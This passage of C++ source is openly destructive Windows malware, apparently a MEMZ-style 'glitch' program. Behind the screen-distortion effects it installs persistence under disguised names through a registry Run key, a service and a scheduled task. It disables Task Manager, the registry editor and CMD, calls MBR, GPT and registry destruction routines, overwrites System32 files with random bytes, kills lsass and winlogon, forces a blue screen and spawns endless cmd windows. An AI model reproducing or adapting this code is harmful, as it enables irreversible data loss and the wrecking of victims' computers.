    historyIndex = (historyIndex + 1) % frameHistory.size();
    
    // Blend with previous frames
    for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
        if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
            int blendIndex = (historyIndex + rand() % (frameHistory.size() - 1)) % frameHistory.size();
            
            pPixels[i] = static_cast<BYTE>((pPixels[i] + frameHistory[blendIndex][i]) / 2);
            pPixels[i+1] = static_cast<BYTE>((pPixels[i+1] + frameHistory[blendIndex][i+1]) / 2);
            pPixels[i+2] = static_cast<BYTE>((pPixels[i+2] + frameHistory[blendIndex][i+2]) / 2);
        }
    }
}

// ======== ENHANCED GLITCH EFFECT ========
void ApplyGlitchEffect() {
    if (!pPixels) return;
    
    BYTE* pCopy = new (std::nothrow) BYTE[screenWidth * screenHeight * 4];
    if (!pCopy) return;
    memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
    
    DWORD currentTime = GetTickCount();
    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 3000);
    intensityLevel = std::min(30, timeIntensity);
    
    ApplyScreenShake();
    
    if (currentTime - lastEffectTime > 800) {
        textCorruptionActive = (rand() % 100 < 40 * intensityLevel);
        matrixRainActive = (rand() % 100 < 30 * intensityLevel);
        fractalNoiseActive = (rand() % 100 < 25 * intensityLevel);
        screenBurnActive = (rand() % 100 < 20 * intensityLevel);
        wormholeEffectActive = (rand() % 100 < 15 * intensityLevel);
        temporalDistortionActive = (rand() % 100 < 10 * intensityLevel);
        lastEffectTime = currentTime;
    }
    
    // Enhanced glitch lines
    int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 10000);
    for (int i = 0; i < effectiveLines; ++i) {
        int y = rand() % screenHeight;
        int height = 1 + rand() % (100 * intensityLevel);
        int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 3 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel * 1.5;
        
        height = std::min(height, screenHeight - y);
        if (height <= 0) continue;
        
        for (int h = 0; h < height; ++h) {
            int currentY = y + h;
            if (currentY >= screenHeight) break;
            
            BYTE* source = pCopy + (currentY * screenWidth * 4);
            BYTE* dest = pPixels + (currentY * screenWidth * 4);
            
            if (xOffset > 0) {
                int copySize = (screenWidth - xOffset) * 4;
                if (copySize > 0) {
                    memmove(dest + xOffset * 4, 
                            source, 
                            copySize);
                }
                for (int x = 0; x < xOffset; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = dis(gen);
                        pPixels[pos + 1] = dis(gen);
                        pPixels[pos + 2] = dis(gen);
                    }
                }
            } 
            else if (xOffset < 0) {
                int absOffset = -xOffset;
                int copySize = (screenWidth - absOffset) * 4;
                if (copySize > 0) {
                    memmove(dest, 
                            source + absOffset * 4, 
                            copySize);
                }
                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = dis(gen);
                        pPixels[pos + 1] = dis(gen);
                        pPixels[pos + 2] = dis(gen);
                    }
                }
            }
        }
    }
    
    // Enhanced block distortion
    int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 2000);
    for (int i = 0; i < effectiveBlocks; ++i) {
        int blockWidth = std::min(100 + rand() % (400 * intensityLevel), screenWidth);
        int blockHeight = std::min(100 + rand() % (400 * intensityLevel), screenHeight);
        int x = rand() % (screenWidth - blockWidth);
        int y = rand() % (screenHeight - blockHeight);
        int offsetX = (rand() % (1000 * intensityLevel)) - 500 * intensityLevel;
        int offsetY = (rand() % (1000 * intensityLevel)) - 500 * intensityLevel;
        
        for (int h = 0; h < blockHeight; h++) {
            int sourceY = y + h;
            int destY = sourceY + offsetY;
            
            if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
                BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
                
                int effectiveWidth = blockWidth;
                if (x + offsetX + blockWidth > screenWidth) {
                    effectiveWidth = screenWidth - (x + offsetX);
                }
                if (x + offsetX < 0) {
                    effectiveWidth = blockWidth + (x + offsetX);
                    source -= (x + offsetX) * 4;
                    dest -= (x + offsetX) * 4;
                }
                
                if (effectiveWidth > 0 && dest >= pPixels && 
                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
                    memcpy(dest, source, effectiveWidth * 4);
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 3 / intensityLevel)) == 0) {
        ApplyColorShift(pPixels, (rand() % 5) + 1);
    }
    
    int effectivePixels = std::min(screenWidth * screenHeight * intensityLevel, 500000);
    for (int i = 0; i < effectivePixels; i++) {
        int x = rand() % screenWidth;
        int y = rand() % screenHeight;
        int pos = (y * screenWidth + x) * 4;
        
        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
            pPixels[pos] = dis(gen);
            pPixels[pos + 1] = dis(gen);
            pPixels[pos + 2] = dis(gen);
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 4 / intensityLevel)) == 0) {
        int centerX = rand() % screenWidth;
        int centerY = rand() % screenHeight;
        int radius = std::min(200 + rand() % (1000 * intensityLevel), screenWidth/2);
        int distortion = 50 + rand() % (150 * intensityLevel);
        
        int yStart = std::max(centerY - radius, 0);
        int yEnd = std::min(centerY + radius, screenHeight);
        int xStart = std::max(centerX - radius, 0);
        int xEnd = std::min(centerX + radius, screenWidth);
        
        for (int y = yStart; y < yEnd; y++) {
            for (int x = xStart; x < xEnd; x++) {
                float dx = static_cast<float>(x - centerX);
                float dy = static_cast<float>(y - centerY);
                float distance = sqrt(dx*dx + dy*dy);
                
                if (distance < radius) {
                    float amount = pow(1.0f - (distance / radius), 2.0f);
                    int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 5 - 2));
                    int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 5 - 2));
                    
                    int srcX = x - shiftX;
                    int srcY = y - shiftY;
                    
                    if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                        int srcPos = (srcY * screenWidth + srcX) * 4;
                        int destPos = (y * screenWidth + x) * 4;
                        
                        if (destPos >= 0 && destPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
                            srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                            pPixels[destPos] = pCopy[srcPos];
                            pPixels[destPos + 1] = pCopy[srcPos + 1];
                            pPixels[destPos + 2] = pCopy[srcPos + 2];
                        }
                    }
                }
            }
        }
    }
    
    if (rand() % 3 == 0) {
        int lineHeight = 1 + rand() % (5 * intensityLevel);
        for (int y = 0; y < screenHeight; y += lineHeight * 2) {
            for (int h = 0; h < lineHeight; h++) {
                if (y + h >= screenHeight) break;
                for (int x = 0; x < screenWidth; x++) {
                    int pos = ((y + h) * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = std::min(pPixels[pos] + 150, 255);
                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 150, 255);
                        pPixels[pos + 2] = std::min(pPixels[pos + 2] + 150, 255);
                    }
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 15 / intensityLevel)) == 0) {
        for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                pPixels[i] = 255 - pPixels[i];
                pPixels[i + 1] = 255 - pPixels[i + 1];
                pPixels[i + 2] = 255 - pPixels[i + 2];
            }
        }
    }
    
    if (intensityLevel > 3 && rand() % 8 == 0) {
        ApplyMeltingEffect(pCopy);
    }
    
    if (textCorruptionActive) {
        ApplyTextCorruption();
    }
    
    if (intensityLevel > 2 && rand() % 12 == 0) {
        ApplyPixelSorting();
    }
    
    if (intensityLevel > 2 && rand() % 6 == 0) {
        ApplyStaticBars();
    }
    
    if (intensityLevel > 3 && rand() % 10 == 0) {
        ApplyInversionWaves();
    }
    
    // Advanced effects
    if (matrixRainActive) {
        ApplyMatrixRain();
    }
    
    if (fractalNoiseActive) {
        ApplyFractalNoise();
    }
    
    if (screenBurnActive) {
        ApplyScreenBurn();
    }
    
    if (wormholeEffectActive) {
        ApplyWormholeEffect();
    }
    
    if (temporalDistortionActive) {
        ApplyTemporalDistortion();
    }
    
    ApplyCursorEffect();
    UpdateParticles();
    
    if (rand() % SOUND_CHANCE == 0) {
        PlayGlitchSoundAsync();
    }
    
    if (rand() % 80 == 0) {
        cursorVisible = !cursorVisible;
        ShowCursor(cursorVisible);
    }
    
    // ===== POPUP RANDOM =====
    static DWORD lastPopupTime = 0;
    if (GetTickCount() - lastPopupTime > 2000 && (rand() % 100 < (25 + intensityLevel * 4))) {
        std::thread(OpenRandomPopups).detach();
        lastPopupTime = GetTickCount();
    }
    
    // ===== DESTRUCTIVE EFFECTS =====
    DWORD cTime = GetTickCount();
    
    // Aktifkan mode kritis setelah 45 detik
    if (!criticalMode && cTime - startTime > 45000) {
        criticalMode = true;
        bsodTriggerTime = cTime + 45000 + rand() % 45000; // BSOD dalam 45-90 detik
        
        if (!persistenceInstalled) {
            InstallPersistence();
            DisableSystemTools();
            DisableCtrlAltDel();
        }
        
        // Aktifkan fitur admin
        if (g_isAdmin) {
            static bool adminDestructionDone = false;
            if (!adminDestructionDone) {
                BreakTaskManager();
                SetCriticalProcess();
                DestroyMBR();
                DestroyGPT();
                DestroyRegistry();
                adminDestructionDone = true;
            }
        }
    }
    
    // Eksekusi tindakan destruktif
    if (criticalMode && !destructiveActionsTriggered) {
        ExecuteDestructiveActions();
    }
    
    // Efek khusus mode kritis
    if (criticalMode) {
        static DWORD lastCorruption = 0;
        if (cTime - lastCorruption > 8000) {
            std::thread(CorruptSystemFiles).detach();
            lastCorruption = cTime;
        }
        
        static DWORD lastKill = 0;
        if (cTime - lastKill > 4000) {
            std::thread(KillCriticalProcesses).detach();
            lastKill = cTime;
        }
        
        intensityLevel = 30;
        
        if (cTime >= bsodTriggerTime) {
            std::thread(TriggerBSOD).detach();
        }
    }
    
    delete[] pCopy;
}

// ======== ENHANCED POPUP FUNCTION ========
void OpenRandomPopups() {
    const wchar_t* commands[] = {
        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0) do start /min cmd /k \"echo CRITICAL FAILURE %random% && ping 127.0.0.1 -n 2 > nul && exit\"\"",
        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 100 }\"",
        L"notepad.exe",
        L"explorer.exe",
        L"write.exe",
        L"calc.exe",
        L"mspaint.exe",
        L"regedit.exe",
        L"taskmgr.exe",
        L"control.exe",
        L"mmc.exe",
        L"services.msc",
        L"eventvwr.msc",
        L"compmgmt.msc",
        L"diskmgmt.msc"
    };

    int numPopups = 5 + rand() % 8; // 5-12 popup sekaligus
    bool spawnSpam = (rand() % 2 == 0); // 50% chance spawn cmd spammer

    for (int i = 0; i < numPopups; i++) {
        int cmdIndex = rand() % (sizeof(commands)/sizeof(commands[0]));
        
        // Untuk cmd spam khusus
        if (spawnSpam && i == 0) {
            ShellExecuteW(NULL, L"open", L"cmd.exe", 
                L"/c start cmd.exe /k \"@echo off && title SYSTEM_FAILURE && for /l %x in (0,0,0) do start /min cmd /k echo ͏҉̷̸G҉̢L͠I͏̵T́C̶H͟ ̀͠D͠E͜T̷ÉC̵T̨E̵D͜ %random% && timeout 1 > nul\"", 
                NULL, SW_SHOWMINIMIZED);
            continue;
        }

        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"open";
        sei.lpFile = L"cmd.exe";
        sei.lpParameters = commands[cmdIndex];
        sei.nShow = (rand() % 2) ? SW_SHOWMINIMIZED : SW_SHOWNORMAL;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        
        ShellExecuteExW(&sei);
        if (sei.hProcess) CloseHandle(sei.hProcess);
        
        Sleep(50); // Shorter delay between popups
    }

    // Spawn khusus Windows Terminal jika ada
    if (rand() % 3 == 0) {
        ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
    }
    
    // Spawn multiple instances of browser with error pages
    if (rand() % 4 == 0) {
        const wchar_t* errorUrls[] = {
            L"https://www.google.com/search?q=system+error+0x0000000A",
            L"https://www.bing.com/search?q=critical+system+failure",
            L"https://www.youtube.com/results?search_query=blue+screen+of+death",
            L"https://www.wikipedia.org/wiki/Fatal_system_error"
        };
        
        for (int i = 0; i < 3; i++) {
            int urlIndex = rand() % (sizeof(errorUrls)/sizeof(errorUrls[0]));
            ShellExecuteW(NULL, L"open", L"iexplore.exe", errorUrls[urlIndex], NULL, SW_SHOWMAXIMIZED);
        }
    }
}

// ======== ENHANCED PERSISTENCE & DESTRUCTION ========
BOOL IsWindows64() {
    BOOL bIsWow64 = FALSE;
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
        GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
    
    if (fnIsWow64Process) {
        fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
    }
    return bIsWow64;
}

void InstallPersistence() {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    wchar_t targetPath[MAX_PATH];
    if (g_isAdmin) {
        GetSystemDirectoryW(targetPath, MAX_PATH);
        lstrcatW(targetPath, L"\\winlogon_helper.exe");
    } else {
        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, targetPath);
        lstrcatW(targetPath, L"\\system_health.exe");
    }
    
    // Handle Wow64 redirection untuk Windows 64-bit
    PVOID oldRedir = NULL;
    if (IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
            if (pfnDisable) pfnDisable(&oldRedir);
        }
    }
    
    CopyFileW(szPath, targetPath, FALSE);
    
    // Set hidden and system attributes
    SetFileAttributesW(targetPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    HKEY hKey;
    if (g_isAdmin) {
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    } else {
        RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    }
    RegSetValueExW(hKey, L"SystemHealthMonitor", 0, REG_SZ, (BYTE*)targetPath, (lstrlenW(targetPath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
    
    // Also add to services if admin
    if (g_isAdmin) {
        SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (scm) {
            SC_HANDLE service = CreateServiceW(
                scm,
                L"SystemHealthMonitor",
                L"System Health Monitoring Service",
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_SEVERE,
                targetPath,
                NULL, NULL, NULL, NULL, NULL
            );
            
            if (service) {
                CloseServiceHandle(service);
            }
            CloseServiceHandle(scm);
        }
    }
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    wchar_t cmd[1024];
    wsprintfW(cmd, 
        L"schtasks /create /tn \"Windows Integrity Check\" /tr \"\\\"%s\\\"\" /sc minute /mo 1 /st %02d:%02d /f",
        targetPath, st.wHour, st.wMinute);
    
    // Ganti WinExec dengan CreateProcess
    STARTUPINFOW si = {};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    // Revert redirection
    if (oldRedir && IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
            if (pfnRevert) pfnRevert(oldRedir);
        }
    }
    
    persistenceInstalled = true;
}

void DisableSystemTools() {
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    DWORD value = 1;
    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
    RegCloseKey(hKey);

    if (g_isAdmin) {
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    
    disableTaskManager = true;
    disableRegistryTools = true;
}

void CorruptSystemFiles() {
    const wchar_t* targets[] = {
        L"C:\\Windows\\System32\\drivers\\*.sys",
        L"C:\\Windows\\System32\\*.dll",
        L"C:\\Windows\\System32\\*.exe",
        L"C:\\Windows\\System32\\config\\*",
        L"C:\\Windows\\System32\\*.mui",
        L"C:\\Windows\\SysWOW64\\*.dll",
        L"C:\\Windows\\SysWOW64\\*.exe",
        L"C:\\Windows\\SysWOW64\\*.mui"
    };
    
    // Handle Wow64 redirection untuk Windows 64-bit
    PVOID oldRedir = NULL;
    if (IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
            if (pfnDisable) pfnDisable(&oldRedir);
        }
    }
    
    for (size_t i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(targets[i], &fd);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    wchar_t filePath[MAX_PATH];
                    if (i == 0) {
                        wsprintfW(filePath, L"C:\\Windows\\System32\\drivers\\%s", fd.cFileName);
                    } else if (i == 3) {
                        wsprintfW(filePath, L"C:\\Windows\\System32\\config\\%s", fd.cFileName);
                    } else if (i >= 5) {
                        wsprintfW(filePath, L"C:\\Windows\\SysWOW64\\%s", fd.cFileName);
                    } else {
                        wsprintfW(filePath, L"C:\\Windows\\System32\\%s", fd.cFileName);
                    }
                    
                    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
                    if (hFile != INVALID_HANDLE_VALUE) {
                        DWORD fileSize = GetFileSize(hFile, NULL);
                        if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
                            BYTE* buffer = new BYTE[fileSize];
                            if (buffer) {
                                for (DWORD j = 0; j < fileSize; j++) {
                                    buffer[j] = static_cast<BYTE>(dis(gen));
                                }
                                
                                DWORD written;
                                WriteFile(hFile, buffer, fileSize, &written, NULL);
                                
                                delete[] buffer;
                            }
                        }
                        CloseHandle(hFile);
                    }
                }
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
    }
    
    // Revert redirection
    if (oldRedir && IsWindows64()) {
        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
        if (hKernel32) {
            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
            if (pfnRevert) pfnRevert(oldRedir);
        }
    }
    
    fileCorruptionActive = true;
}

void KillCriticalProcesses() {
    const wchar_t* targets[] = {
        L"taskmgr.exe",
        L"explorer.exe",
        L"msconfig.exe",
        L"cmd.exe",
        L"powershell.exe",
        L"regedit.exe",
        L"mmc.exe",
        L"services.exe",
        L"svchost.exe",
        L"winlogon.exe",
        L"lsass.exe",
        L"csrss.exe",
        L"smss.exe",
        L"wininit.exe",
        L"spoolsv.exe"
    };
    
    DWORD processes[1024], cbNeeded;
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        DWORD cProcesses = cbNeeded / sizeof(DWORD);
        
        for (DWORD i = 0; i < cProcesses; i++) {
            wchar_t szProcessName[MAX_PATH] = L"<unknown>";
            
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, processes[i]);
            if (hProcess) {
                HMODULE hMod;
                DWORD cbNeeded;
                
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(wchar_t));
                    
                    for (size_t j = 0; j < sizeof(targets)/sizeof(targets[0]); j++) {
                        if (lstrcmpiW(szProcessName, targets[j]) == 0) {
                            TerminateProcess(hProcess, 0);
                            break;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    
    processKillerActive = true;
}

void TriggerBSOD() {
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
    if (ntdll) {
        typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
        pdef_NtRaiseHardError NtRaiseHardError = 
            reinterpret_cast<pdef_NtRaiseHardError>(GetProcAddress(ntdll, "NtRaiseHardError"));
        
        if (NtRaiseHardError) {
            ULONG Response;
            NTSTATUS status = STATUS_FLOAT_MULTIPLE_FAULTS;
            NtRaiseHardError(status, 0, 0, 0, 6, &Response);
        }
    }
    
    // Additional BSOD methods
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
    typedef NTSTATUS(NTAPI* pdef_ZwRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
    
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        pdef_RtlAdjustPrivilege RtlAdjustPrivilege = reinterpret_cast<pdef_RtlAdjustPrivilege>(
            GetProcAddress(hNtdll, "RtlAdjustPrivilege"));
        pdef_ZwRaiseHardError ZwRaiseHardError = reinterpret_cast<pdef_ZwRaiseHardError>(
            GetProcAddress(hNtdll, "ZwRaiseHardError"));
        
        if (RtlAdjustPrivilege && ZwRaiseHardError) {
            BOOLEAN bEnabled;
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
            ZwRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &ULONG(0));
        }
    }
    
    // Fallback: Cause access violation
    int* p = (int*)0x1;
    *p = 0;
}

// ======== ENHANCED WINDOW PROCEDURE ========
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HDC hdcLayered = NULL;
    static BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
    
    switch (msg) {
    case WM_CREATE:
        hdcLayered = CreateCompatibleDC(NULL);
        SetTimer(hwnd, 1, REFRESH_RATE, NULL);
        return 0;
        
    case WM_TIMER: {
        CaptureScreen(hwnd);
        ApplyGlitchEffect();
        
        if (hdcLayered && hGlitchBitmap) {
            HDC hdcScreen = GetDC(NULL);
            POINT ptZero = {0, 0};
            SIZE size = {screenWidth, screenHeight};
            
            SelectObject(hdcLayered, hGlitchBitmap);
            UpdateLayeredWindow(hwnd, hdcScreen, &ptZero, &size, hdcLayered, 
                               &ptZero, 0, &blend, ULW_ALPHA);
            
            ReleaseDC(NULL, hdcScreen);
        }
        return 0;
    }
        
    case WM_DESTROY:
        KillTimer(hwnd, 1);
        if (hGlitchBitmap) DeleteObject(hGlitchBitmap);
        if (hdcLayered) DeleteDC(hdcLayered);
        ShowCursor(TRUE);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

// ======== ENHANCED BACKGROUND PROCESS ========
void RunBackgroundProcess() {
    FreeConsole();
    
    // Inisialisasi layar
    HDC hdcScreen = GetDC(NULL);
    screenWidth = GetSystemMetrics(SM_CXSCREEN);
    screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = -screenHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    
    hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    ReleaseDC(NULL, hdcScreen);
    
    // Main loop background
    while (true) {
        if (!persistenceInstalled) {
            InstallPersistence();
            DisableSystemTools();
            DisableCtrlAltDel();
            
            if (g_isAdmin) {
                BreakTaskManager();
                SetCriticalProcess();
            }
        }
        
        CaptureScreen(NULL);
        ApplyGlitchEffect();
        
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        SelectObject(hdcMem, hGlitchBitmap);
        
        POINT ptZero = {0, 0};
        SIZE size = {screenWidth, screenHeight};
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
        
        HWND hDesktop = GetDesktopWindow();
        UpdateLayeredWindow(hDesktop, hdcScreen, &ptZero, &size, hdcMem, 
                           &ptZero, 0, &blend, ULW_ALPHA);
        
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        
        Sleep(REFRESH_RATE);
    }
}

// ======== ENHANCED MAIN FUNCTION ========
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    // Initialize GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Initialize random seed
    srand(static_cast<unsigned>(time(NULL)));
    
    // Deteksi mode admin
    g_isAdmin = IsRunAsAdmin();

    // Tampilkan peringatan pertama
    if (MessageBoxW(NULL, 
        L"WARNING: This program will cause serious system damage!\n\n"
        L"Proceed only if you understand the risks."
        L"This program is NOT TO BE TESTED ON A PRODUCTIVE COMPUTER.\n\n"
        L"Do you really want to continue?",
        L"CRITICAL SECURITY ALERT", 
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES)
    {
        return 0;
    }
    
    // Tampilkan peringatan kedua
    if (MessageBoxW(NULL, 
        L"FINAL WARNING: This will cause:\n"
        L"- Extreme visual impact\n"
        L"- Continuous system pop-ups\n"
        L"- Possible system damage\n"
        L"- Computer instability\n"
        L"- Data loss and corruption\n\n"
        L"Press 'OK' only if you are ready to accept the consequences.",
        L"FINAL CONFIRMATION", 
        MB_OKCANCEL | MB_ICONERROR | MB_DEFBUTTON2) != IDOK)
    {
        return 0;
    }

    // Cek jika sudah berjalan
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\WinlogonHelperMutex");
    DWORD lastError = GetLastError();
    if (lastError == ERROR_ALREADY_EXISTS) {
        if (hMutex) {
            CloseHandle(hMutex);
        }
        
        if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
            return 0;
        }
        
        wchar_t szPath[MAX_PATH];
        GetModuleFileNameW(NULL, szPath, MAX_PATH);
        
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpFile = szPath;
        sei.lpParameters = L"-background";
        sei.nShow = SW_HIDE;
        ShellExecuteExW(&sei);
        return 0;
    }

    startTime = GetTickCount();
    
    // Jalankan background process
    if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
        RunBackgroundProcess();
        return 0;
    }
    
    // Jalankan instance utama
    FreeConsole();
    
    WNDCLASSEXW wc = {
        sizeof(WNDCLASSEX), 
        CS_HREDRAW | CS_VREDRAW, 
        WndProc,
        0, 0, hInst, NULL, NULL, NULL, NULL,
        L"MEMZ_GLITCH_SIM", NULL
    };
    RegisterClassExW(&wc);
    
    HWND hwnd = CreateWindowExW(
